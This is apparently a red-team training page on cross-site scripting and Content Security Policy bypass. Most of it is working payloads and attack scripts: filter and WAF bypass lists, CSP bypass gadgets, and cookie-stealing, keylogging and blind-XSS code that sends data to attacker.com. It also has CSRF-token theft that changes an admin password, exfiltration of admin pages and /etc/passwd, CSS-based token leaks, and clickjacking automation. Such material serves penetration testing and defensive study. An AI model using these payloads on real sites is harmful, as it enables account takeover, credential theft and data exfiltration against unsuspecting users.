---
layout: training-page
title: "XSS & CSP Bypass — Red Team Academy"
module: "Web Hacking"
tags:
  - xss
  - dom-xss
  - csp-bypass
  - mutation-xss
  - account-takeover
page_key: "web-xss"
render_with_liquid: false
---

# XSS & CSP Bypass

XSS remains a gateway to account takeover, credential theft, and phishing. Beyond basic reflected and stored payloads, modern engagements require DOM-based XSS analysis, mutation XSS (mXSS) for filter bypass, and Content Security Policy bypass to execute scripts in hardened applications.

## XSS Types Overview

```
# Reflected XSS: payload in request, echoed in response immediately
# Stored XSS: payload stored in DB, executes for every viewer
# DOM-based XSS: payload processed by client-side JS without server involvement
# Blind XSS: fires in back-end admin panel you can't see directly

# Quick detection:
<script>alert(1)</script>
'"><script>alert(1)</script>
javascript:alert(1)
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

## DOM-Based XSS

Source (user-controlled input) flows into a sink (dangerous function) in client-side JavaScript. No server reflection needed.

```
# Common DOM sources:
# location.href, location.hash, location.search
# document.referrer, document.cookie
# window.name, postMessage data

# Common DOM sinks:
# eval(), setTimeout(), setInterval()
# innerHTML, outerHTML, document.write()
# element.src, element.href, element.action

# DOM XSS via location.hash:
# URL: https://target/#<img src=x onerror=alert(1)>
# If JS does: document.getElementById('x').innerHTML = location.hash.slice(1)
# → XSS fires client-side

# DOM XSS detection with DOM Invader (Burp):
# Enable in Burp's embedded browser → scans for sources→sinks

# Manual source hunting:
# Chrome DevTools → Sources → search for:
# location.hash, location.search, innerHTML, document.write, eval

# postMessage XSS — if page listens to all origins:
# In browser console on attacker page:
window.open('https://target/page');
setTimeout(() => {
  window.opener.postMessage('<img src=x onerror=alert(1)>', '*');
}, 2000);
```

## CSP Bypass Techniques

Content Security Policy restricts script sources. Misconfigurations allow bypass.

```
# Read CSP:
curl -I https://target/ | grep -i content-security-policy
# Or: DevTools → Network → response headers

# Analyze CSP:
# Paste into https://csp-evaluator.withgoogle.com/

# Bypass 1: unsafe-inline still present:
# CSP: script-src 'self' 'unsafe-inline'
# → inline scripts still work: <script>alert(1)</script>

# Bypass 2: Whitelisted CDN with user content:
# CSP: script-src 'self' https://cdn.jsdelivr.net
# → host malicious JS on jsdelivr via GitHub:
# https://cdn.jsdelivr.net/gh/attacker/repo@main/xss.js
<script src="https://cdn.jsdelivr.net/gh/attacker/repo@main/xss.js"></script>

# Bypass 3: JSONP endpoint on whitelisted domain:
# CSP: script-src 'self' https://trusted.com
# If trusted.com has JSONP: https://trusted.com/api?callback=alert(1)
<script src="https://trusted.com/api?callback=alert(1)"></script>

# Bypass 4: script-src 'nonce-xxxx' with DOM injection:
# If nonce is injectable into existing script tag:
# <script nonce="xxxx">var x = 'INJECT'; </script>
# Inject: '; alert(1);//

# Bypass 5: base tag hijack (base-uri not set):
# Inject: <base href="https://attacker.com/">
# All relative script/link URLs now load from attacker.com

# Bypass 6: object-src missing:
# <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

# Bypass 7: strict-dynamic misuse:
# If script creates new scripts: allows anything loaded by trusted script
```

## Mutation XSS (mXSS)

The browser's HTML parser mutates sanitized markup into XSS when it's re-parsed or inserted into the DOM.

```
# DOMPurify mXSS bypasses (historical — test on current version):
# SVG namespace confusion:
<svg><p><style><g title="</style><img src onerror=alert(1)>">

# Template element mutation:
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

# Polyglot XSS payload:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

# Test mXSS in sanitizers with mXSS.io or mutation testing tools
```

## Stored XSS to Account Takeover

```
# Cookie theft (if not HttpOnly):
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>

# Session token theft via XHR (SameSite=None required):
<script>
fetch('/api/user/profile', {credentials:'include'})
  .then(r=>r.json())
  .then(d=>fetch('https://attacker.com/exfil?data='+btoa(JSON.stringify(d))))
</script>

# Password change via CSRF + XSS (bypasses SameSite):
# XSS runs in same origin → can read CSRF token, make authenticated requests
<script>
fetch('/settings/password', {method:'GET',credentials:'include'})
  .then(r=>r.text())
  .then(html=>{
    const csrf = html.match(/csrf.*?value="([^"]+)"/)[1];
    return fetch('/settings/password', {
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'csrf='+csrf+'&new_password=hacked123&confirm=hacked123'
    });
  })
</script>

# Keylogger via XSS:
<script>
document.addEventListener('keydown', e=>
  fetch('https://attacker.com/keys?k='+e.key+'&url='+location.href)
);
</script>
```

## Blind XSS

```
# Fires in an admin panel, email client, log viewer, etc. you can't see
# Use XSS Hunter or interactsh to receive callback:

# XSS Hunter payload (captures screenshot, cookies, DOM, keystrokes):
<script src="https://yoursubdomain.xss.ht"></script>

# Manual blind XSS (fetch-based callback):
<script>
new Image().src='https://attacker.com/blind?'+
  'cookie='+encodeURIComponent(document.cookie)+
  '&url='+encodeURIComponent(location.href)+
  '&user='+encodeURIComponent(document.querySelector('[name=username]')?.value||'')
</script>

# Inject in fields processed by admins:
# Support ticket content, user registration name, log messages,
# error reports, feedback forms, order notes
```

## XSS Filter Bypass Cheatsheet

```
# If script tag blocked:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>

# Encoded payloads:
<img src=x onerror="alert(1)">  # HTML entities
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">  # Unicode escape
<script>\x61\x6c\x65\x72\x74(1)</script>  # hex escape

# Without parentheses (for CSP bypasses):
<script>alert`1`</script>      # template literal
onerror=alert;throw 1           # error event
<svg><animate onbegin=alert(1) attributeName=x></svg>
```

## SecLists XSS Payload Lists

See [Web Fuzzing Payloads](/web/fuzzing-payloads/) for full context and usage examples.

```
# /usr/share/seclists/Fuzzing/XSS/
#
# Polyglots/XSS-Polyglots.txt              14  — multi-context polyglots (start here)
# Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt  — single comprehensive polyglot
# human-friendly/XSS-Jhaddix.txt               — curated, real-world bypass rate
# human-friendly/XSS-BruteLogic.txt            — minimal, high bypass rate
# human-friendly/XSS-Cheat-Sheet-PortSwigger.txt — PortSwigger lab payloads
# human-friendly/XSS-payloadbox.txt            — large collection, all contexts
# human-friendly/xss-without-parentheses-semi-colons-portswigger.txt — WAF bypass
# robot-friendly/ — URL-encoded versions of all above, for automated scanners

# Quick polyglot scan with dalfox:
dalfox url "https://target.com/search?q=XSS" \
  --custom-payload /usr/share/seclists/Fuzzing/XSS/Polyglots/XSS-Polyglots.txt

# ffuf XSS detection:
ffuf -u "https://target.com/search?q=FUZZ" \
  -w /usr/share/seclists/Fuzzing/XSS/Polyglots/XSS-Polyglots.txt \
  -mr "alert|onerror|onload" -v
```

## CSS-Based Data Exfiltration (No JavaScript)

When JavaScript XSS is blocked by a strict CSP but CSS injection is possible, CSS can exfiltrate data to an attacker server. CSS attribute selectors trigger background/font network requests when they match elements — by sweeping all possible characters for each position you can reconstruct hidden values character by character. Source: PortSwigger research and css-exfiltration project.

### Technique 1 — Attribute Value Leak via CSS Selector

```
/* Leak input[value] char by char via attribute prefix selectors.
   Attacker server logs which URL was fetched → that char matched. */

/* First character sweep: */
input[name="csrf"][value^="a"] { background: url("https://attacker.com/?v=a"); }
input[name="csrf"][value^="b"] { background: url("https://attacker.com/?v=b"); }
/* ... repeat for all alphanumeric + special chars ... */

/* After 'a' confirmed, second character sweep: */
input[name="csrf"][value^="aa"] { background: url("https://attacker.com/?v=aa"); }
input[name="csrf"][value^="ab"] { background: url("https://attacker.com/?v=ab"); }

/* CSS attribute selector operators:
   [attr^="x"]  starts with x     (most useful for sequential exfil)
   [attr$="x"]  ends with x
   [attr*="x"]  contains x        */
```

### Technique 2 — Font unicode-range Exfiltration

```
/* @font-face with unicode-range only loads the font file when that
   Unicode codepoint is rendered on screen. Apply to the element
   containing the secret — whichever character requests arrive at
   your server reveal which characters are present. */

@font-face {
  src: url("https://attacker.com/leak?c=A");
  unicode-range: U+0041;   /* 'A' */
  font-family: steal;
}
@font-face {
  src: url("https://attacker.com/leak?c=0");
  unicode-range: U+0030;   /* '0' */
  font-family: steal;
}
/* Repeat for each character of interest */

/* Target the secret-containing element: */
input[name="token"] {
  font-family: steal;
  display: block !important;
}

/* Reveals WHICH characters are present, not ORDER.
   Combine with ^= attribute selectors to determine order. */
```

### Technique 3 — CSS Injection Attack Chain

```
# Find CSS injection point:
# Example — user-controlled value reflected inside <style> tag:
https://target.com/profile?theme=red
# Response: <style>body{background:red}</style>

# Inject CSS to close context and load attacker CSS:
?theme=red;}@import+url(//attacker.com/steal.css);/*

# attacker.com/steal.css contains attribute selector sweep:
# (served with correct Content-Type: text/css)

# Injection breaking out of a value:
?theme=red}body{background:url(//attacker.com/probe)}body{color:red

# Test for blind CSS injection (Burp Collaborator):
?theme=red;background:url(//BURP_COLLAB/)
# Watch Collaborator for HTTP callback
```

### CSS Exfiltration Limitations

```
# What CSS exfil CAN steal:
# - HTML attribute values (value=, data-*, name=, action=, href=)
# - CSRF tokens in hidden inputs
# - API keys in meta tags
# - Any text rendered in an element with a known selector

# What it CANNOT steal (without browser-specific tricks):
# - Content inside <script> tags (browsers don't render script text)
# - Text nodes (requires :first-line + overflow tricks — browser-specific)
# - Values after user interaction (input fields not yet submitted)

# Requires:
# - CSS injection or injecting a <style> / <link> tag
# - Target element must be rendered in the DOM
# - Browser to load the CSS (user must visit the page)
# - Attacker-controlled server to receive the callback requests
```

## xsstools — XSS Development Framework

xsstools is a JavaScript XSS development framework (by YesWeHack) that abstracts payload construction, exfiltration, and delivery wrapping into a chainable API. It eliminates the repetitive boilerplate of writing XSS payloads from scratch, handling encoding, DOM manipulation, and data exfiltration in a composable way.

### Basic Usage — Exfiltrate Cookies and DOM Data

```
<script type="module">
import {Exfiltrators, Payload, Wrapper, utils} from "./xsstools.min.js"

// Choose an exfiltration channel
const exfiltrator = Exfiltrators.message()   // postMessage — no outbound request needed

// Build a payload chain:
const payload = Payload.new()
    .addExfiltrator(exfiltrator)
    .eval(() => document.cookie)    // evaluate and stage cookie value
    .exfiltrate()                   // send via the exfiltrator
    .fetchDOM("/user/me")           // fetch /user/me page DOM
    .querySelector("input[name='apikey']", 'value')  // extract API key from DOM
    .exfiltrate()                   // send that too
    .postUrlEncoded("/user/changePassword", {"password": "hacked"})  // side effect

// Wrap the payload to bypass filters:
const wrapper = Wrapper.new()
    .evalB64()     // base64-encode eval'd code
    .svgLoad()     // embed in SVG onload attribute
    .iframe()      // wrap in iframe

const exploit = wrapper.wrap(payload)

const target = "http://vulnerable.domain?param=" + encodeURIComponent(exploit)
window.open(target)
</script>
```

### Exfiltrators

```
# Available exfiltration channels:
Exfiltrators.message()        // postMessage — no outbound network request
Exfiltrators.get(url)         // fetch GET to attacker URL
Exfiltrators.post(url)        // fetch POST urlencoded
Exfiltrators.postJSON(url)    // fetch POST JSON
Exfiltrators.sendBeacon(url)  // navigator.sendBeacon (fires on page unload)
Exfiltrators.console()        // console.log — for local debugging
Exfiltrators.img(url)         // <img src=...> — simple GET, bypasses CSP fetch-src
Exfiltrators.style(url)       // <style> @import — CSS channel
Exfiltrators.iframe(url)      // <iframe src=...> — GET
```

### Payload Chaining API

```
# Common Payload methods:
Payload.new()
    .addExfiltrator(exfil)           // attach an exfiltrator
    .eval(() => document.cookie)    // run arbitrary JS, stage the result
    .exfiltrate()                   // flush staged data via exfiltrator
    .startKeyLogger()               // attach document keydown listener
    .fetchDOM(path)                 // fetch a URL and load its DOM
    .fetchJSON(path)                // fetch a URL, parse JSON
    .querySelector(selector, attr)  // extract attribute from loaded DOM
    .postUrlEncoded(path, data)     // POST data as application/x-www-form-urlencoded
    .postJSON(path, data)           // POST data as JSON
```

### Wrappers — Payload Encoding and Delivery

```
# Wrappers encode/embed the payload to bypass input filters:
const wrapper = Wrapper.new()
    .minify()          // remove whitespace — bypass length limits
    .templateString()  // wrap in template literal `${...}`
    .imgLoad()         // <img src=x onerror=PAYLOAD>
    .svgLoad()         // <svg onload=PAYLOAD>
    .innerHTML()       // element.innerHTML = PAYLOAD
    .script()          // <script>PAYLOAD</script>
    .iframe()          // <iframe srcdoc=PAYLOAD>
    .evalB64()         // eval(atob("BASE64_PAYLOAD"))

# Wrappers stack — each wraps the previous layer:
const wrapped = Wrapper.new().evalB64().svgLoad().iframe().wrap("alert(1)")
# Result: <iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>">
```

### ClickJacker — Clickjacking Automation

```
# Automate clickjacking attacks against specific UI elements:
const cj = new ClickJacker("https://target.com/settings/delete-account")

// Add click steps by bounding box coordinates:
cj.addStep({x: 42, y: 34, width: 64, height: 35})  // "Delete Account" button
cj.addStep({x: 200, y: 150, width: 80, height: 30}) // "Confirm" dialog

await cj.run()

// Find element bounding boxes interactively — paste into browser console:
(()=>{function e(e){e.classList.remove(o),l?e.onclick=l:c.removeEventListener("click",n)}function t({clientX:t,clientY:i}){const d=document.elementFromPoint(t,i);d!=c&&(d.classList.add(o),c&&e(c),d.onclick?(l=d.onclick,d.onclick=n):(l=null,d.addEventListener("click",n,{once:!0})),c=d)}function n(n){n.preventDefault(),n.stopPropagation();let{x:o,y:i,height:c,width:l}=n.target.getBoundingClientRect();[o,i,c,l]=[o,i,c,l].map(e=>+e.toFixed(2)),window.prompt("Bounding box",JSON.stringify({x:o,y:i,height:c,width:l})),e(n.target),window.removeEventListener("mousemove",t)}const o="xxx-selected",i=document.createElement("style");i.innerText=`.${o} {box-shadow: 0 0 0 1px red inset, 0 0 0 1px red;}`;let c=null,l=null;window.addEventListener("mousemove",t),document.body.appendChild(i)})();
```

### Installation

```
# Build from source:
git clone https://github.com/yeswehack/xsstools
cd xsstools
yarn install
yarn build
# Output: dist/xsstools.min.js

# Host the built file on your attacker server:
python3 -m http.server 8080

# Reference in your XSS payload:
<script type="module" src="http://ATTACKER/xsstools.min.js"></script>

# Or inline the minified JS directly in the payload (no external load required)
```

## XSS Payload Library

Curated payload collection from PayloadsAllTheThings for different injection contexts.

### Tag and Event Handler Variants

```
<!-- Script tag variants -->
<script>alert(1)</script>
<sCrIpt>alert(1)</ScRipt>
<script x>alert(1)</script y>

<!-- Event handler tags -->
<img src=x onerror=alert(1)>
<img src='1' onerror='alert(0)' <
<svg onload=alert(1)>
<svg/OnLoad="`${prompt``}`">
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

<!-- Without parentheses (bypass strict CSP/filters): -->
<script>alert`1`</script>
onerror=alert;throw 1
<svg><animate onbegin=alert(1) attributeName=x></svg>
```

## Filter Bypass Techniques

From PayloadsAllTheThings XSS Filter Bypass reference.

### Case and Tag Bypass

```
<!-- Case sensitivity bypass -->
<sCrIpt>alert(1)</ScRipt>
<ScrIPt>alert(1)</ScRipT>

<!-- Incomplete HTML tag (works IE/Firefox/Chrome) -->
<img src='1' onerror='alert(0)' <

<!-- Code evaluation bypass (blacklisted words split across strings) -->
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
Set.constructor('ale'+'rt(13)')();

<!-- Bypass quotes for string -->
String.fromCharCode(88,83,83)
```

### Encoding Bypass

```
<!-- HTML entity encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Unicode escape -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<!-- Octal encoding -->
<script>\141\154\145\162\164(1)</script>

<!-- Hex escape -->
<script>\x61\x6c\x65\x72\x74(1)</script>

<!-- Bypass dot filter (use bracket notation): -->
window['document']['cookie']
window['alert'](1)

<!-- Bypass parentheses and semicolons: -->
alert`1`
<svg><animate onbegin=alert(1) attributeName=x>

<!-- Bypass onxxxx= blacklist using non-standard events: -->
<svg onload=alert(1)>
<body/onhashchange=alert(1)><a href=#>click</a>

<!-- Bypass space filter (use / or tab or newline): -->
<svg/onload=alert(1)>
<img/src/onerror=alert(1)>
<svg%09onload=alert(1)>
```

## WAF Bypass Payloads

Specific payloads that bypass common WAFs, sourced from PayloadsAllTheThings.

### Cloudflare Bypasses

```
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
{% raw %}<svg/OnLoad="`${prompt``}`">{% endraw %}
<svg/onload=%26nbsp;alert`payload`+
1'"><img/src/onerror=.1|alert``>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

### Incapsula WAF Bypasses

```
<svg onload\r\n=$.globalEval("al"+"ert()");>>
anythinglr00</script><script>alert(document.domain)</script>uxldz
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```

### Akamai WAF Bypasses

```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
```

## CSP Bypass

Content Security Policy bypass techniques from PayloadsAllTheThings. Always analyze the CSP first at `csp-evaluator.withgoogle.com`.

### Bypass CSP via JSONP on Whitelisted Domain

```
<!-- Requirement: script-src whitelists google.com or youtube.com -->
<script src="//google.com/complete/search?client=chrome&jsonp=alert(1);"></script>
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>
<script src="https://www.youtube.com/oembed?callback=alert;"></script>

<!-- Full JSONP endpoint list: github.com/zigoo0/JSONBee/blob/master/jsonp.txt -->
```

### Bypass CSP default-src (iframe gadget)

```
<!-- Requirement: default-src 'self' 'unsafe-inline' -->
<script>
f=document.createElement("iframe");
f.src="/robots.txt";
f.onload=()=>{
  x=document.createElement('script');
  x.src='//attacker.com/csp.js';
  f.contentWindow.document.body.appendChild(x)
};
document.body.appendChild(f);
</script>
```

### Bypass CSP script-src self (object tag)

```
<!-- Requirement: script-src 'self' -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

### Bypass CSP nonce via DOM injection

```
<!-- If nonce is reflected in page and DOM manipulation is possible -->
<!-- 1. Find the nonce value from existing <script nonce="XXXX"> -->
<!-- 2. Create script element with correct nonce: -->
<script>
var s=document.createElement('script');
s.nonce=document.querySelector('script[nonce]').nonce;
s.src='//attacker.com/xss.js';
document.body.appendChild(s);
</script>

<!-- If nonce value appears in error messages or source: -->
<script nonce="LEAKED_NONCE">alert(1)</script>
```

### CSP Bypass via base tag (base-uri not set)

```
<!-- If CSP doesn't set base-uri, inject base tag to hijack relative URLs -->
<base href="https://attacker.com/">
<!-- All subsequent relative <script src="app.js"> now load from attacker.com -->
```

## XSS Filter Evasion Techniques

When basic XSS payloads are blocked, these techniques bypass filters that rely on keyword matching, tag recognition, or partial sanitization.

```
# Case variation — filters often check lowercase only:
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</sCrIpT>

# Non-alpha-non-digit separators between tag and attribute:
<SCRIPT/XSS SRC="http://attacker.com/xss.js"></SCRIPT>
<BODY onload!#$%()*~+-_.,:;?@[/|\]^=alert(1)>

# Embedded tab, newline, carriage return in javascript: URL:
<a href="jav&#x09;ascript:alert(1)">click</a>
<a href="jav&#x0A;ascript:alert(1)">click</a>
<a href="jav&#x0D;ascript:alert(1)">click</a>

# Decimal HTML character references (no semicolons needed):
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">click</a>

# fromCharCode to avoid quotes entirely:
<a href="javascript:alert(String.fromCharCode(88,83,83))">click</a>

# Malformed IMG tag — browser auto-closes:
<IMG ""><SCRIPT>alert(1)</SCRIPT>

# Default SRC triggering event handler:
<IMG SRC=# onmouseover="alert(1)">
<IMG onmouseover="alert(1)">
<IMG SRC=/ onerror="alert(1)">

# No closing SCRIPT tag (Firefox):
<SCRIPT SRC=http://attacker.com/xss.js?< B >

# SVG onload (widely supported):
<svg/onload=alert(1)>

# XSS polyglot — works in multiple contexts:
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>

# Escaping JavaScript escapes (in JS string context):
\";alert(1);//
</script><script>alert(1)</script>

# End title tag context:
</TITLE><SCRIPT>alert(1)</SCRIPT>
```

## CSP Analysis for Attackers

Before trying XSS exploitation, analyze the CSP to understand what payloads will execute. A well-configured strict CSP can make XSS unexploitable — but most CSPs have weaknesses.

```
# Extract CSP from response header:
curl -sI https://target.com | grep -i content-security-policy

# Use CSP Evaluator (automated bypass finder):
# https://csp-evaluator.withgoogle.com/?csp=YOUR_CSP_HERE

# Common CSP weaknesses and bypasses:

# 1. unsafe-inline present → inline scripts execute:
# Content-Security-Policy: script-src 'self' 'unsafe-inline'
# → <script>alert(1)</script> works

# 2. unsafe-eval present → eval() works
# → eval("alert(1)") works in page context

# 3. Wildcard domain → load from any subdomain:
# script-src *.example.com → find any subdomain you can write to

# 4. Trusted CDN with JSONP callback endpoint:
# script-src 'self' cdn.jsdelivr.net
# <script src="https://trusted-cdn.com/api?callback=alert"></script>

# 5. data: URI in script-src:
# script-src 'self' data: → <script src="data:text/javascript,alert(1)"></script>

# 6. Nonce reuse detection (nonce should be unique per response):
for i in $(seq 1 5); do
  curl -sI https://target.com | grep -o "nonce-[a-zA-Z0-9+/=]*"
done
# Same nonce every time = bypass with: <script nonce="STATIC_NONCE">alert(1)</script>

# 7. Missing base-uri directive:
# CSP: script-src 'self'; (no base-uri restriction)
# Inject: <base href="https://attacker.com/">
# All relative <script src="app.js"> now load from attacker.com

# 8. Angular + unsafe-inline bypass (if Angular in allowed CDN):
# <div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

# 9. Report-Only mode = not enforced:
curl -sI https://target.com | grep -i "report-only"
# Content-Security-Policy-Report-Only: → XSS executes freely
```

## XSS Session Attack Chains

When you have XSS in a victim's session, you can do far more than alert(1). The victim's cookies and CSRF tokens are accessible, enabling full account takeover and pivoting to admin-only endpoints.

### Account Takeover — Extract CSRF Token, Change Password

If the password-change form uses a CSRF token but doesn't require the old password, XSS gives you everything needed to take over the account.

```
// Inject via XSS — load from attacker exploit server:
// <script src="https://exploit.attacker.com/exploit"></script>

// Step 1: Fetch the page containing the CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);   // synchronous request
xhr.withCredentials = true;
xhr.send();

// Step 2: Parse the DOM and extract the token
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// Step 3: Submit the password-change POST with the stolen token
var csrf_req = new XMLHttpRequest();
var params = 'username=admin&email=admin@target.com&password=pwned&csrf_token=' + csrftoken;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);

// Result: admin account password changed to "pwned" — log in as admin
```

### Chaining to Admin-Only Endpoints — LFI Discovery

XSS lets you enumerate endpoints the victim can reach that you can't access directly. Use XSS to exfiltrate responses from internal/admin endpoints and chain into further vulnerabilities (LFI, SSRF, API abuse).

```
// Step 1: Exfiltrate the admin page response via XSS
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = function() {
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'https://attacker.com:4443/log', true);
    exfil.setRequestHeader('Content-Type', 'application/json');
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();

// Step 2: Decode the exfiltrated response on your server
echo 'BASE64_HERE' | base64 -d > admin_response.html

// Step 3: If the admin page accepts ?view= parameter, test for LFI:
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', '/admin.php?view=../../../../etc/passwd', true);
xhr2.withCredentials = true;
xhr2.onload = function() {
    var exfil2 = new XMLHttpRequest();
    exfil2.open('POST', 'https://attacker.com:4443/log', true);
    exfil2.setRequestHeader('Content-Type', 'application/json');
    exfil2.send(JSON.stringify({data: btoa(xhr2.responseText)}));
};
xhr2.send();
```

### Key Principle

XSS vulnerabilities are bounded only by what the victim's session can do. Treat XSS as a full same-origin code execution primitive: enumerate every privileged endpoint, read every form field containing a token or sensitive data, and chain into CSRF, IDOR, or injection vulnerabilities reachable only from the victim's context.

## Tools

- Burp Suite DOM Invader — DOM XSS source/sink analysis
- XSS Hunter — `xsshunter.trufflesecurity.com`
- dalfox — `github.com/hahwul/dalfox` — fast XSS scanner
- xsstools — XSS development framework — `github.com/yeswehack/xsstools`
- PortSwigger XSS labs — `portswigger.net/web-security/cross-site-scripting`
- XSS cheat sheet — `portswigger.net/web-security/cross-site-scripting/cheat-sheet`
- PortSwigger CSS injection research — `portswigger.net/research/blind-css-exfiltration`
- css-exfiltration techniques — `github.com/terminalh4ck/css-exfiltration`
- SecLists XSS lists — [Web Fuzzing Payloads](/web/fuzzing-payloads/)
- OWASP XSS Filter Evasion Cheat Sheet — `cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html`
- CSP Evaluator — `csp-evaluator.withgoogle.com`
